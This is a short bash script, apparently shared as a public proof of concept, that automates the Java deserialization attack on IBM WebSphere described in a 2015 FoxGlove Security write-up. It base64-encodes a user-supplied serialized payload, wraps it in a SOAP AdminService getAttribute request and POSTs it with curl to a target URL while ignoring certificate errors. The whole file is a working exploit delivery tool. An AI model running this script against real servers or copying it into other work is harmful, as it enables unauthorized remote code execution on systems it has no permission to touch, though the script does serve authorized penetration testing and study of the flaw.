websphere.sh

#!/bin/bash
# Usage $0 URL payload
# Shell script created by @anantshri to automated the process outlined at http://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/
if [ $# -eq 2 ]
then
  payload=`base64 $2`
  url=$1
  echo '<?xml version='"'"'1.0'"'"' encoding='"'"'UTF-8'"'"'?>\n<SOAP-ENV:Envelope xmlns:SOAP-ENV="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema">\n<SOAP-ENV:Header xmlns:ns0="admin" ns0:WASRemoteRuntimeVersion="8.5.5.1" ns0:JMXMessageVersion="1.2.0" ns0:SecurityEnabled="true" ns0:JMXVersion="1.2.0">\n<LoginMethod>BasicAuth</LoginMethod>\n</SOAP-ENV:Header>\n<SOAP-ENV:Body>\n<ns1:getAttribute xmlns:ns1="urn:AdminService" SOAP-ENV:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/">\n<objectname xsi:type="ns1:javax.management.ObjectName">'$payload'</objectname>\n<attribute xsi:type="xsd:string">ringBufferSize</attribute>\n</ns1:getAttribute></SOAP-ENV:Body>\n</SOAP-ENV:Envelope>' > testpayload.xml
  curl -i -s -k -X 'POST' -H 'Content-Type: text/xml; charset=utf-8' -H 'SOAPAction: "urn:AdminService"' --data-binary @testpayload.xml $url
else 
	echo "Usage : $0 URL Payload"
fi
